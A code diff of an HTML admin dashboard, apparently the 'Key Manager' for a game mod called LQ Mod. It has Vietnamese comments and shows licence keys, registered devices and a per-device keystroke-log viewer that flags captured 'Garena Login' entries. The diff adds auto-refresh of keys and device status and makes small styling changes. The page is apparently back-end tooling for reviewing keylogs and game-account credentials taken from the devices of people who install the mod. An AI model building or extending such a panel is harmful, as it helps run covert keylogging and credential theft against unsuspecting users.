@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🔐 Key Manager - LQ Mod8</title>
+<title>🔐 Key Manager - LQ Mod6</title>
 <style>
   :root {
     --bg: #0a0e1a;
@@ -952,7 +952,7 @@ function renderDevicesList(key, filterQ) {
       </div>
       <div class="dfirst" style="margin-top:8px">🕐 Lần đầu: ${new Date(d.firstSeen).toLocaleString('vi-VN')}</div>
       <div class="dlast">🕐 Lần cuối: ${new Date(d.lastSeen).toLocaleString('vi-VN')}</div>
-      <div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap">
+      <div style="margin-top:8px">
         <button class="btn btn-info btn-sm" style="font-size:11px;padding:4px 10px"
           onclick="openKeylogModal('${idEsc}','${nameEsc||idEsc}')">
           ⌨️ Log bàn phím
@@ -1712,7 +1712,7 @@ async function klLoadLog(deviceId) {
       return `<div class="kl-row${isGarenaLogin ? ' kl-row-cred' : ''}">
         <div class="kl-ts">
           <span>#${num} · ${ts}</span>
-          ${isGarenaLogin ? '<span class="kl-badge">🎮 Garena Login</span>' : '<span class="kl-badge">📝 Log</span>'}
+          ${isGarenaLogin ? '<span class="kl-badge">🎮 Garena Login</span>' : '<span class="kl-badge kl-badge-chat">📝 Log</span>'}
         </div>
         ${bodyHtml}
       </div>`;
@@ -1744,6 +1744,35 @@ async function clearKeylog() {
 function escapeHtml(s) {
   return (s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
+
+// ── Auto-refresh danh sách key mỗi 15s (cập nhật online status real-time) ──
+let _autoRefreshTimer = null;
+function startAutoRefresh() {
+  if (_autoRefreshTimer) clearInterval(_autoRefreshTimer);
+  _autoRefreshTimer = setInterval(async () => {
+    // Chỉ refresh khi đang ở trang quản lý key (không refresh khi modal mở)
+    if (document.getElementById('keys-tbody')) {
+      try {
+        const data = await apiGet('/api/admin/list');
+        keys = data.keys || [];
+        filterTable(); // áp dụng lại bộ lọc hiện tại
+        renderStats();
+        // Nếu modal thiết bị đang mở, cập nhật lại danh sách thiết bị
+        const devModal = document.getElementById('devices-modal');
+        if (devModal && devModal.style.display !== 'none' && window._devicesCurrentKey) {
+          const dSearch = document.getElementById('device-search');
+          renderDevicesList(window._devicesCurrentKey, dSearch ? dSearch.value.toLowerCase() : '');
+        }
+      } catch(e) { /* silent */ }
+    }
+  }, 15000);
+}
+// Bắt đầu auto-refresh sau khi login thành công (loadAllKeys() được gọi)
+const _origLoadAllKeys = loadAllKeys;
+window.loadAllKeys = async function() {
+  await _origLoadAllKeys();
+  startAutoRefresh();
+};
 </script>
 
 <!-- ── Modal: Keylog Viewer ── -->
@@ -1771,6 +1800,7 @@ function escapeHtml(s) {
 .kl-field-key { font-size:11px;color:var(--text2);white-space:nowrap;min-width:70px;padding-top:1px; }
 .kl-field-val { font-size:13px;color:var(--text1);word-break:break-all; }
 .kl-token     { font-size:11px;color:#a5b4fc;font-family:monospace; }
+.kl-badge-chat{ background:rgba(99,102,241,.15);color:#a5b4fc;border-color:rgba(99,102,241,.3); }
 </style>
 </body>
 </html>
